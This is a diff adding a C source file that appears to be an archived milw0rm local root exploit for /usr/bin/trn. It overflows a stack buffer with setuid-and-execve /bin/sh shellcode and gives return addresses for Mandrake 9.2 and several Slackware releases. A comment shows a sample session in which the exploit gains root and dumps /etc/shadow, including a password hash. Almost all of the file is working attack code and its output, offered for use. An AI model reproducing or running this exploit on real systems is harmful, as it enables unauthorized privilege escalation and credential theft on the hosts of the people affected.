@@ -1,0 +1,71 @@
+/*
+/usr/bin/trn local root exploit
+By ZzagorR - http://www.rootbinbash.com
+*/
+/*
+ sh-2.05b$ ./trn
+  usage   : ./trn ret buf
+  example : ./trn 0xbfffff64
+  [+] mandrake   9.2  = 0xbfffff96
+  [+] slackware 10.0.0= 0xbfffff98
+  [+] slackware  9.1.0= 0xbfffff84
+ sh-2.05b$
+ sh-2.05b$ ./trn 0xbfffff84 128
+  [BOO  %] 128
+  [RET  %] bfffff84
+ sh-2.05b#
+ sh-2.05b# id
+  uid=0(root) gid=98(nobody) groups=98(nobody)
+ sh-2.05b# cat /etc/shadow
+  root:$1$N88/N.aP$dBWcFHiYCXXNb77Y5LPNK1:12705:0:::::
+TEST :
+ MANDRAKE 9.2
+ SLACKWARE 10.0.0
+ SLACKWARE 9.1.0
+ http://www.rootbinbash.com/d0kum4n/trn-test.txt
+BOO:
+ $trn `perl -e 'print "A" x 120'`
+ $trn `perl -e 'print "A" x 124'`
+ $trn `perl -e 'print "A" x 128'`
+  Segmentation fault
+BOO=128
+*/
+
+#include <stdio.h>
+#include <string.h>
+#define NEREDE "/usr/bin/trn"
+
+char caylarbeles[] =
+"\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
+"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
+"\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
+
+int main(int argc, char *argv[]){
+ int bizim;
+ char bufe[1000];
+ char *tayfasi;
+ if (argc < 3) {
+  printf ("{           trn l0c4l r00t 3xpl01t          }\n");
+  printf ("{  By ZzagorR - http://www.rootbinbash.com  }\n");
+  printf ("{  usage   : %s ret buf                  }\n",argv[0]);
+  printf ("{  example : %s 0xbfffff99 142           }\n",argv[0]);
+  printf ("{  mandrake   9.2   = 0xbfffff96            }\n");
+  printf ("{  slackware 10.0.0 = 0xbfffff98            }\n");
+  printf ("{  slackware  9.1.0 = 0xbfffff84            }\n");
+  exit(1);
+ }else{
+  unsigned long RET=strtoul(argv[1], NULL, 16);
+  int BOO = atoi(argv[2]);
+   printf ("[BOO  %] %i\n",BOO);
+   printf ("[RET  %] %x\n",RET);
+  tayfasi = bufe;
+  memset(bufe, 0x41,256-strlen(caylarbeles));
+  sprintf(bufe+256-strlen(caylarbeles), "%s", caylarbeles);
+  for ( bizim = BOO; bizim <= BOO+4; bizim+= 4 )
+   *(long*)(tayfasi+bizim) = RET;
+  execl(NEREDE, NEREDE , bufe, NULL);
+ }
+}
+
+// milw0rm.com [2005-01-26]
